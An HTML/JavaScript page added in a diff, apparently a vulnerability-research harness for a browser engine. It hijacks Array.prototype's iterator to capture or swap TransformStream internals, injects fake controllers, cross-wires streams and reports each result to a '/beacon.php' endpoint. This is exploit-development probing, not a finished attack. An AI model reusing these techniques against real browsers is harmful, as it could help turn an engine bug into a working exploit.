@@ -1,0 +1,309 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1145v3</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1145v3: CONTROLLER INTERCEPT + FULL ITER LOGGING ===');
+log('info','P1145v2 showed: ALL permutations accepted including FFF!');
+log('info','Key Q: does our fake controller get CALLED during transform?');
+B('P1145V3-START','t='+Date.now());
+
+var origIter=Array.prototype[Symbol.iterator];
+
+// ===== SECTION A: Log ALL iterator calls with full detail =====
+log('phase','--- A: Full iterator logging ---');
+var allCalls=[];
+
+Array.prototype[Symbol.iterator]=function(){
+  var info={pass:allCalls.length+1, len:this.length, types:[]};
+  for(var i=0;i<Math.min(this.length,5);i++){
+    var t={type:typeof this[i], ctor:'?'};
+    try{t.ctor=this[i].constructor.name;}catch(e){t.ctor='null/undef';}
+    try{if(this[i] instanceof ReadableStream) t.ctor='ReadableStream';}catch(e){}
+    try{if(this[i] instanceof WritableStream) t.ctor='WritableStream';}catch(e){}
+    try{if(this[i] && this[i].desiredSize!==undefined && this[i].enqueue) t.ctor='Controller?';}catch(e){}
+    info.types.push(t);
+  }
+  allCalls.push(info);
+  return origIter.call(this);
+};
+
+try{
+  var tsA=new TransformStream({
+    transform:function(chunk,ctrl){ctrl.enqueue(chunk+'_TRANSFORMED');}
+  });
+  log('ok','Created with transform callback');
+}catch(e){
+  log('fail','Error: '+e.message);
+}
+
+Array.prototype[Symbol.iterator]=origIter;
+
+for(var i=0;i<allCalls.length;i++){
+  var c=allCalls[i];
+  var typeStr=c.types.map(function(t){return t.ctor;}).join(',');
+  log('info','Call '+c.pass+': len='+c.len+' types=['+typeStr+']');
+}
+B('P1145V3-CALLS','n='+allCalls.length+'|'+allCalls.map(function(c){return 'L'+c.len+':'+c.types.map(function(t){return t.ctor;}).join('/');}).join('|'));
+
+// ===== SECTION B: Instrumented fake controller =====
+log('phase','--- B: Fake controller with method logging ---');
+var controllerCalls=[];
+var realThird=null;
+var passB=0;
+
+function makeInstrumentedController(){
+  return {
+    _calls:[],
+    enqueue:function(chunk){
+      controllerCalls.push({method:'enqueue',chunk:String(chunk).substring(0,50)});
+      log('win','CONTROLLER.enqueue('+String(chunk).substring(0,30)+')');
+      B('P1145V3-CTRL-ENQUEUE','chunk='+String(chunk).substring(0,80));
+    },
+    error:function(e){
+      controllerCalls.push({method:'error',err:String(e)});
+      log('win','CONTROLLER.error('+e+')');
+      B('P1145V3-CTRL-ERROR','e='+e);
+    },
+    terminate:function(){
+      controllerCalls.push({method:'terminate'});
+      log('win','CONTROLLER.terminate()');
+      B('P1145V3-CTRL-TERMINATE','');
+    },
+    get desiredSize(){
+      controllerCalls.push({method:'desiredSize'});
+      return 1;
+    }
+  };
+}
+
+Array.prototype[Symbol.iterator]=function(){
+  passB++;
+  if(passB===1 && this.length>=3){
+    realThird=this[2];
+  }
+  if(passB===2 && this.length>=3){
+    // Replace ONLY the controller (third item) with our instrumented one
+    var fake=makeInstrumentedController();
+    return [this[0], this[1], fake][Symbol.iterator]();
+  }
+  return origIter.call(this);
+};
+
+var bResult='?';
+var tsB=null;
+try{
+  passB=0;
+  controllerCalls=[];
+  tsB=new TransformStream({
+    transform:function(chunk,ctrl){
+      log('info','User transform called: chunk='+chunk);
+      B('P1145V3-USER-TRANSFORM','chunk='+chunk);
+      ctrl.enqueue(chunk+'_OUT');
+    }
+  });
+  bResult='OK';
+  log('ok','TransformStream with fake controller: OK');
+}catch(e){
+  bResult='ERR:'+e.message;
+  log('fail','Error: '+e.message);
+}
+B('P1145V3-FAKECTRL',bResult);
+
+Array.prototype[Symbol.iterator]=origIter;
+
+// Now WRITE data through the stream and see if our controller gets called!
+if(tsB){
+  log('phase','--- B2: Write through confused stream ---');
+  try{
+    var writer=tsB.writable.getWriter();
+    writer.write('PAYLOAD_1');
+    writer.write('PAYLOAD_2');
+    writer.close();
+
+    var reader=tsB.readable.getReader();
+    var readResults=[];
+
+    function readNext(){
+      reader.read().then(function(res){
+        if(!res.done){
+          readResults.push(res.value);
+          log('ok','Read: '+res.value);
+          B('P1145V3-READ','val='+res.value);
+          readNext();
+        }else{
+          log('info','Stream done. Total reads: '+readResults.length);
+          log('info','Controller calls: '+controllerCalls.length);
+          B('P1145V3-B2-DONE','reads='+readResults.length+'|ctrl_calls='+controllerCalls.length+'|methods='+controllerCalls.map(function(c){return c.method;}).join(','));
+
+          // Continue to Section C after reads complete
+          doSectionC();
+        }
+      },function(e){
+        log('fail','Read error: '+e);
+        B('P1145V3-READ-ERR',String(e));
+        doSectionC();
+      });
+    }
+    readNext();
+  }catch(e){
+    log('fail','Write error: '+e.message);
+    B('P1145V3-WRITE-ERR',e.message);
+    doSectionC();
+  }
+}else{
+  doSectionC();
+}
+
+function doSectionC(){
+  // ===== SECTION C: Cross-wired streams =====
+  log('phase','--- C: Cross-wire two TransformStreams ---');
+
+  // Create TS1, capture its internal streams
+  // Create TS2, substitute TS1's streams into TS2
+  // Result: TS2's external API wraps TS1's internals!
+  var ts1Internals=null;
+  var passC=0;
+
+  Array.prototype[Symbol.iterator]=function(){
+    passC++;
+    if(passC<=2 && this.length>=3){
+      if(passC===1) ts1Internals=[this[0],this[1],this[2]];
+    }
+    return origIter.call(this);
+  };
+
+  var tsC1=null;
+  try{
+    passC=0;
+    tsC1=new TransformStream();
+    log('ok','TS1 created, internals captured: '+(ts1Internals?'yes':'no'));
+  }catch(e){log('fail','TS1: '+e.message);}
+
+  Array.prototype[Symbol.iterator]=origIter;
+
+  if(ts1Internals){
+    // Now create TS2 with TS1's internals substituted on second pass
+    passC=0;
+    Array.prototype[Symbol.iterator]=function(){
+      passC++;
+      if(passC===2 && this.length>=3){
+        // Substitute TS1's internals into TS2!
+        return ts1Internals[Symbol.iterator]();
+      }
+      return origIter.call(this);
+    };
+
+    var tsC2=null;
+    try{
+      passC=0;
+      tsC2=new TransformStream();
+      log('ok','TS2 created with TS1 internals substituted');
+      B('P1145V3-CROSSWIRE','ok=true');
+
+      // Write to TS1, read from TS2 (or vice versa)
+      // If cross-wired, data written to TS1 should appear on TS2!
+      try{
+        var w1=tsC1.writable.getWriter();
+        w1.write('CROSS_DATA');
+        w1.close();
+
+        var r2=tsC2.readable.getReader();
+        r2.read().then(function(res){
+          if(!res.done){
+            log('win','!!! CROSS-WIRE READ: '+res.value+' !!!');
+            B('P1145V3-CROSSREAD','val='+res.value);
+          }else{
+            log('info','Cross-wire read: done (empty)');
+            B('P1145V3-CROSSREAD','done=true');
+          }
+        },function(e){
+          log('fail','Cross-wire read error: '+e);
+          B('P1145V3-CROSSREAD-ERR',String(e));
+        });
+
+        // Also try reading from TS1 and writing to TS2
+        var r1=tsC1.readable.getReader();
+        r1.read().then(function(res){
+          log('info','TS1.read: '+(res.done?'done':res.value));
+          B('P1145V3-TS1READ',res.done?'done':'val='+res.value);
+        });
+
+      }catch(e3){
+        log('fail','Cross test: '+e3.message);
+        B('P1145V3-CROSS-ERR',e3.message);
+      }
+    }catch(e){
+      log('fail','TS2: '+e.message);
+      B('P1145V3-CROSSWIRE-ERR',e.message);
+    }
+
+    Array.prototype[Symbol.iterator]=origIter;
+  }
+
+  // ===== SECTION D: Real controller reference capture =====
+  log('phase','--- D: Capture + use real controller ---');
+  var capturedCtrl=null;
+  var passD=0;
+
+  Array.prototype[Symbol.iterator]=function(){
+    passD++;
+    if(passD===1 && this.length>=3){
+      capturedCtrl=this[2];
+    }
+    return origIter.call(this);
+  };
+
+  try{
+    passD=0;
+    var tsD=new TransformStream();
+
+    Array.prototype[Symbol.iterator]=origIter;
+
+    // capturedCtrl should be the REAL TransformStreamDefaultController
+    if(capturedCtrl){
+      var ctrlInfo={type:typeof capturedCtrl};
+      try{ctrlInfo.ctor=capturedCtrl.constructor.name;}catch(e){ctrlInfo.ctor='?';}
+      try{ctrlInfo.desiredSize=capturedCtrl.desiredSize;}catch(e){ctrlInfo.desiredSize='ERR';}
+      try{ctrlInfo.hasEnqueue=typeof capturedCtrl.enqueue;}catch(e){}
+      try{ctrlInfo.hasError=typeof capturedCtrl.error;}catch(e){}
+      try{ctrlInfo.hasTerminate=typeof capturedCtrl.terminate;}catch(e){}
+
+      log('ok','Captured controller: ctor='+ctrlInfo.ctor+' desiredSize='+ctrlInfo.desiredSize);
+      log('info','  enqueue='+ctrlInfo.hasEnqueue+' error='+ctrlInfo.hasError+' terminate='+ctrlInfo.hasTerminate);
+      B('P1145V3-REALCTRL','ctor='+ctrlInfo.ctor+'|ds='+ctrlInfo.desiredSize+'|enq='+ctrlInfo.hasEnqueue);
+
+      // Try calling enqueue on the captured controller directly!
+      try{
+        capturedCtrl.enqueue('INJECTED_DATA');
+        log('win','!!! DIRECT ENQUEUE SUCCEEDED !!!');
+        B('P1145V3-INJECT','enqueue=OK');
+
+        // Read from tsD to see if our data appears
+        var rD=tsD.readable.getReader();
+        rD.read().then(function(res){
+          log('win','Direct inject read: '+(res.done?'done':res.value));
+          B('P1145V3-INJECT-READ',res.done?'done':'val='+res.value);
+        });
+      }catch(e){
+        log('fail','Direct enqueue: '+e.message);
+        B('P1145V3-INJECT-ERR',e.message);
+      }
+    }else{
+      Array.prototype[Symbol.iterator]=origIter;
+      log('fail','No controller captured');
+    }
+  }catch(e){
+    Array.prototype[Symbol.iterator]=origIter;
+    log('fail','Section D: '+e.message);
+  }
+
+  setTimeout(function(){
+    B('P1145V3-DONE','ctrl_calls='+controllerCalls.length+'|crosswire='+(ts1Internals?'yes':'no'));
+    log('phase','=== P1145v3 COMPLETE ===');
+  },500);
+}
+</script></body></html>
